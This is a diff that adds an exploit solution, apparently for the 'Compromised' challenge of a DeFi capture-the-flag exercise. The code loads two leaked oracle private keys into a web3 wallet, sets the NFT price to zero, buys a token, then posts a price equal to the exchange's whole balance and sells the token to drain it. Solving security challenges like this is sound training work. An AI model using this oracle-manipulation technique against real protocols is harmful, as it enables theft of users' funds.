@@ -51,6 +51,52 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+
+        const abi = [{
+            "inputs": [
+              {
+                "internalType": "string",
+                "name": "symbol",
+                "type": "string"
+              },
+              {
+                "internalType": "uint256",
+                "name": "newPrice",
+                "type": "uint256"
+              }
+            ],
+            "name": "postPrice",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+          }];
+
+        // Keys are from the message intercepted, transformed from hex and base64
+        const keys = [
+            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        ];
+        web3.eth.accounts.wallet.add(keys[0]);
+        web3.eth.accounts.wallet.add(keys[1]);
+
+        const contract = new web3.eth.Contract(abi, this.oracle.address);
+        
+        // Set price to 0
+        await contract.methods.postPrice("DVNFT", 0).send({from: web3.eth.accounts.wallet[0].address, gas: ether('0.0000000000001')});
+        await contract.methods.postPrice("DVNFT", 0).send({from: web3.eth.accounts.wallet[1].address, gas: ether('0.0000000000001')});
+
+        // Buy one
+        const evt = await this.exchange.buyOne({from: attacker, value: ether("0.1")});
+        const tokenId = evt.logs[0].args.tokenId.toString();
+
+        // Set price to max
+        await contract.methods.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.toString()).send({from: web3.eth.accounts.wallet[0].address, gas: ether('0.0000000000001')});
+        await contract.methods.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.toString()).send({from: web3.eth.accounts.wallet[1].address, gas: ether('0.0000000000001')});
+
+        // Sell one
+        await this.token.approve(this.exchange.address, tokenId, {from: attacker});
+        await this.exchange.sellOne(1, {from: attacker});
+
     });
 
     after(async function () {
